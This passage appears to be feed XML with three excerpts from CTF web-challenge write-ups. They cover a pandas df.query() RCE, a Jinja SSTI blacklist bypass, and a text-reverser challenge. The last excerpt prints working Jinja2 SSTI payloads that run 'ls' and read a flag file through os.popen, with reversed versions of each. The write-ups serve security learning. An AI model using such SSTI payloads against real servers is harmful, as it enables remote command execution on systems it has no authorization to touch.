      <description>This challenge was about python CGI scripts, where instead of having regular .cgi scripts, python is used to run them which makes it easier to write. Combined with an RCE in pandas&amp;rsquo;s df.query() function.
Analysis This challenge required many steps but they were very well staged in a way that wasn&amp;rsquo;t guessy. I admit tho at first we only got the nginx.conf file which doesn&amp;rsquo;t really give us much, but then we were given the Dockerfile and that made it much easier to analyse.</description>

      <description>Description This challenge was about acheiving SSTI rce with an abstract way of getting the attributes and builtins. The idea was inspired from the GDG Algiers CTF 2022.
I really loved the idea of using some abstract filter that can  &amp;ldquo;almost&amp;rdquo;  trully bypass any blacklist ( still need more research ) but the main thing is that we can now trully call any attribute using this trick and its rare that a blacklist would prevent you from using the map filter.</description>

      <description>Mostly solved the web challenges with Task_Hashed
 Reverser the website is a text reverser and from the source code we can tell its an SSTI so we just have to put a regular SSTI payload but just reversed
regular payload:
{{config.__class__.__init__.__globals__[&#39;os&#39;].popen(&#39;ls&#39;).read()}} {{config.__class__.__init__.__globals__[&#39;os&#39;].popen(&#39;cat flag-ccba9605-afeb-49a6-8aac-d56bac20705b.txt&#39;).read()}} supplied reversed payload:
}} )(daer.)&#39;sl&#39;(nepop.]&#39;so&#39;[__slabolg__.__tini__.__ssalc__.gifnoc {{ }})(daer.)&#39;txt.b50702cab65d-caa8-6a94-befa-5069abcc-galf tac&#39;(nepop.]&#39;so&#39;[__slabolg__.__tini__.__ssalc__.gifnoc{{  Pastebin the important part of this challenge is :
if (paste.search(/&amp;lt;.*&amp;gt;/) !== -1) { return res.redirect(&amp;#39;/flash?message=Illegal characters in paste!</description>
